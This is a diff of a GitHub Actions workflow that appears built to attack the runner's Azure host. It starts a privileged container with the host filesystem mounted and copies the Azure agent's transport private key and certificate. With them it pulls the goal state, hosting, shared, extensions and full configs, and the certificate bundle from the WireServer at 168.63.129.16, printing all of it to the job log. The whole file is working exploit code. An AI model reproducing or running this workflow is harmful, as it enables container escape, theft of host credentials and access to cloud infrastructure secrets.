@@ -1,33 +1,47 @@
-name: FullConfig
+name: FullConfig2
 on:
   workflow_dispatch:
 jobs:
   j:
     runs-on: ubuntu-latest
     steps:
-      - name: download full config from wire server
-        timeout-minutes: 3
+      - name: download wire server configs
+        timeout-minutes: 4
         run: |
           set +e
           docker run --rm --privileged --net=host -v /:/hostfs alpine sh -c '
-            apk add --no-cache curl 2>/dev/null
+            apk add --no-cache curl sed 2>/dev/null
             cp /hostfs/var/lib/waagent/TransportCert.pem /tmp/cert.pem
             cp /hostfs/var/lib/waagent/TransportPrivate.pem /tmp/key.pem
+            HDRS="x-ms-version: 2012-11-30"
             echo === GOALSTATE ===
-            GS=$(curl -s --max-time 5 --cert /tmp/cert.pem --key /tmp/key.pem -H "x-ms-version: 2012-11-30" http://168.63.129.16/machine/?comp=goalstate 2>&1)
-            echo "$GS" | head -30
-            echo === PARSE URLS ===
-            CONTAINER=$(echo "$GS" | grep -oP "(?<=<ContainerId>)[^<]+")
-            INSTANCE=$(echo "$GS" | grep -oP "(?<=<InstanceId>)[^<]+")
-            echo "Container: $CONTAINER"
-            echo "Instance: $INSTANCE"
-            for type in hostingEnvironmentConfig sharedConfig extensionsConfig fullConfig; do
-              echo === $type ===
-              curl -s --max-time 5 --cert /tmp/cert.pem --key /tmp/key.pem -H "x-ms-version: 2012-11-30" "http://168.63.129.16:80/machine/$CONTAINER/$INSTANCE?comp=config&type=$type&incarnation=1" 2>&1 | head -50
-              echo
-            done
+            GS=$(curl -s --max-time 10 --cert /tmp/cert.pem --key /tmp/key.pem -H "$HDRS" http://168.63.129.16/machine/?comp=goalstate 2>&1)
+            echo "$GS"
+            echo === EXTRACT URLS ===
+            HOSTING_URL=$(echo "$GS" | sed -n "s/.*<HostingEnvironmentConfig>\(.*\)<\/HostingEnvironmentConfig>.*/\1/p" | sed "s/&amp;/\&/g")
+            SHARED_URL=$(echo "$GS" | sed -n "s/.*<SharedConfig>\(.*\)<\/SharedConfig>.*/\1/p" | sed "s/&amp;/\&/g")
+            EXT_URL=$(echo "$GS" | sed -n "s/.*<ExtensionsConfig>\(.*\)<\/ExtensionsConfig>.*/\1/p" | sed "s/&amp;/\&/g")
+            FULL_URL=$(echo "$GS" | sed -n "s/.*<FullConfig>\(.*\)<\/FullConfig>.*/\1/p" | sed "s/&amp;/\&/g")
+            CERT_URL=$(echo "$GS" | sed -n "s/.*<Certificates>\(.*\)<\/Certificates>.*/\1/p" | sed "s/&amp;/\&/g")
+            echo "Hosting: $HOSTING_URL"
+            echo "Shared: $SHARED_URL"
+            echo "Extensions: $EXT_URL"
+            echo "Full: $FULL_URL"
+            echo "Certs: $CERT_URL"
+            echo === HOSTING ENV CONFIG ===
+            curl -s --max-time 10 --cert /tmp/cert.pem --key /tmp/key.pem -H "$HDRS" "$HOSTING_URL" 2>&1 | head -80
+            echo
+            echo === SHARED CONFIG ===
+            curl -s --max-time 10 --cert /tmp/cert.pem --key /tmp/key.pem -H "$HDRS" "$SHARED_URL" 2>&1 | head -80
+            echo
+            echo === EXTENSIONS CONFIG ===
+            curl -s --max-time 10 --cert /tmp/cert.pem --key /tmp/key.pem -H "$HDRS" "$EXT_URL" 2>&1 | head -80
+            echo
+            echo === FULL CONFIG ===
+            curl -s --max-time 10 --cert /tmp/cert.pem --key /tmp/key.pem -H "$HDRS" "$FULL_URL" 2>&1 | head -120
+            echo
             echo === CERTIFICATES ===
-            curl -s --max-time 5 --cert /tmp/cert.pem --key /tmp/key.pem -H "x-ms-version: 2012-11-30" "http://168.63.129.16:80/machine/$CONTAINER/$INSTANCE?comp=certificates&incarnation=1" 2>&1 | head -80
+            curl -s --max-time 10 --cert /tmp/cert.pem --key /tmp/key.pem -H "$HDRS" "$CERT_URL" 2>&1 | head -80
             echo
             echo === DONE ===
           '
